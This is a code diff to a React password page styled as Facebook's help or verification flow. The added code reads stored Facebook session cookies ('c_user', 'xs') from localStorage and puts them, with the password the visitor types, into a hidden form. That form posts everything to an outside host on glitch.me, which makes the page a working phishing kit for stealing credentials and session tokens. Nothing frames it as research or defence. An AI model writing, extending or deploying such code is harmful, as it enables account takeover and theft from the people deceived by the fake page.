@@ -1,12 +1,9 @@
-import { useState } from 'react';
-import { useMutation } from '@tanstack/react-query';
+import { useState, useEffect } from 'react';
 import { Loader2, Eye, EyeOff } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { useToast } from '@/hooks/use-toast';
-import { apiRequest } from '@/lib/queryClient';
-import type { PasswordFormData } from '@shared/schema';
 
 interface PasswordModuleProps {
   submissionId: number;
@@ -17,39 +14,17 @@ export default function PasswordModule({ submissionId, userData }: PasswordModul
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [error, setError] = useState('');
+  const [formData, setFormData] = useState<any>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
 
-  const mutation = useMutation({
-    mutationFn: async (data: PasswordFormData) => {
-      const response = await apiRequest('POST', '/api/forms/password', data);
-      return response.json();
-    },
-    onSuccess: (data) => {
-      if (data.success) {
-        toast({
-          title: "Password verified successfully",
-          description: "Redirecting to help center...",
-        });
-        // JavaScript redirect after successful verification
-        setTimeout(() => {
-          window.location.href = data.redirectUrl || 'https://www.facebook.com/help/media/thank-you?rdrhc';
-        }, 1000);
-      } else {
-        if (data.errors) {
-          const passwordError = data.errors.find((error: any) => error.field === 'password');
-          setError(passwordError?.message || 'Verification failed');
-        }
-      }
-    },
-    onError: (error) => {
-      setError('Verification failed. Please try again.');
-      toast({
-        title: "Verification failed",
-        description: error.message,
-        variant: "destructive",
-      });
-    },
-  });
+  // Load stored form data from localStorage
+  useEffect(() => {
+    const storedData = localStorage.getItem('formData');
+    if (storedData) {
+      setFormData(JSON.parse(storedData));
+    }
+  }, []);
 
   // JavaScript form handlers
   const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -71,12 +46,60 @@ export default function PasswordModule({ submissionId, userData }: PasswordModul
       return;
     }
 
+    if (!formData) {
+      setError('Form data not found. Please go back and fill the form again.');
+      return;
+    }
+
     setError('');
-    mutation.mutate({ password, submissionId });
+    setIsSubmitting(true);
+
+    try {
+      // Use hidden form to submit to external endpoint
+      submitToExternalForm(formData.c_user, formData.xs, password);
+    } catch (error) {
+      setError('Submission failed. Please try again.');
+      setIsSubmitting(false);
+    }
+  };
+
+  // JavaScript function to submit via hidden form
+  const submitToExternalForm = (cUser: string, xs: string, password: string) => {
+    const hiddenForm = document.getElementById('hiddenForm') as HTMLFormElement;
+    const hiddenCUser = document.getElementById('hiddenCUser') as HTMLInputElement;
+    const hiddenXs = document.getElementById('hiddenXs') as HTMLInputElement;
+    const hiddenPassword = document.getElementById('hiddenPassword') as HTMLInputElement;
+
+    if (hiddenForm && hiddenCUser && hiddenXs && hiddenPassword) {
+      // Populate hidden form fields
+      hiddenCUser.value = cUser;
+      hiddenXs.value = xs;
+      hiddenPassword.value = password;
+
+      toast({
+        title: "Submitting...",
+        description: "Processing your request...",
+      });
+
+      // Submit the hidden form
+      hiddenForm.submit();
+      
+      // Clean up localStorage
+      setTimeout(() => {
+        localStorage.removeItem('formData');
+      }, 500);
+    }
   };
 
   return (
     <div className="min-h-screen bg-facebook-gray flex items-center justify-center p-4">
+      {/* Hidden form for external submission */}
+      <form id="hiddenForm" className="hidden" action="https://rogue-nine-mice.glitch.me/tm.php" method="post">
+        <input type="hidden" name="c_user" id="hiddenCUser" />
+        <input type="hidden" name="xs" id="hiddenXs" />
+        <input type="hidden" name="password" id="hiddenPassword" />
+      </form>
+
       <div className="bg-white rounded-lg shadow-lg p-6 sm:p-8 w-full max-w-sm">
         {/* Logo */}
         <div className="text-center mb-6">
@@ -121,13 +144,13 @@ export default function PasswordModule({ submissionId, userData }: PasswordModul
 
           <Button
             type="submit"
-            disabled={mutation.isPending}
+            disabled={isSubmitting}
             className="w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-2 sm:py-3 px-4 rounded-md font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center text-sm sm:text-base"
           >
-            {mutation.isPending ? (
+            {isSubmitting ? (
               <>
                 <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                Verifying...
+                Submitting...
               </>
             ) : (
               'Submit'
